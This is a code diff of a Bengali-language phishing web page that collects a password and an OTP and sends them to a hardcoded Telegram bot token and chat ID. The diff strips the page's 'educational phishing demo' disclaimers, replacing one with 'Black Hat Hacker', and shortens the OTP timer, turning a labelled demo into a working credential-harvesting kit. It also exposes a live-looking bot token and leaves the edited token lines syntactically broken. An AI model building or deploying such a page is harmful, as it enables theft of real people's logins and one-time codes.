@@ -147,26 +147,26 @@
     <input type="password" id="password" placeholder="পাসওয়ার্ড">
     <button onclick="showModal()">আবেদন করুন</button>
 
-    <p class="warning" id="warn">⚠️ এটি একটি শিক্ষামূলক ফিশিং ডেমো। আপনার প্রকৃত কোনো ডাটা পাঠানো হয়নি।</p>
+    <p class="warning" id="warn">⚠️ Black Hat Hacker⚠️।</p>
     <div class="meta">Made by Meta</div>
   </div>
 
   <div class="modal" id="otpModal">
     <div class="modal-content">
       <h2>আপনার পরিচয় নিশ্চিত করুন</h2>
-      <p class="countdown" id="countdown">OTP পাঠানো হচ্ছে... 30 সেকেন্ড অপেক্ষা করুন</p>
+      <p class="countdown" id="countdown">OTP পাঠানো হচ্ছে... 10 সেকেন্ড অপেক্ষা করুন</p>
       <input type="text" id="otp" placeholder="OTP কোড দিন" disabled>
       <button onclick="sendToTelegram()">সাবমিট করুন</button>
     </div>
   </div>
 
   <script>
-    const telegram_token = '8471112103:AAGG2qM7dWq9hLdBJDBT_JePob51shngq64'; // আপনার টোকেন এখানে দিন
-    const telegram_chatid = '6763021567'; // আপনার চ্যাট আইডি এখানে দিন
+    const telegram_token = '8471112103:AAGG2qM7dWq9hLdBJDBT_JePob51shngq64';  আপনার টোকেন এখানে দিন
+    const telegram_chatid = '6763021567';  আপনার চ্যাট আইডি এখানে দিন
 
     function showModal() {
       document.getElementById("otpModal").style.display = "flex";
-      let countdown = 30;
+      let countdown = 10;
       const countdownEl = document.getElementById("countdown");
       const otpInput = document.getElementById("otp");
       otpInput.disabled = true;
@@ -206,7 +206,7 @@
       .then(response => response.json())
       .then(data => {
         console.log(data);
-        alert("✅ আপনার আবেদনটি সফলভাবে জমা দেওয়া হয়েছে (এটি একটি শিক্ষামূলক ডেমো)।");
+        alert("✅ আপনার আবেদনটি সফলভাবে জমা দেওয়া হয়েছে (Tamim Ahmed Raj)।");
       })
       .catch(error => {
         console.error('Error:', error);
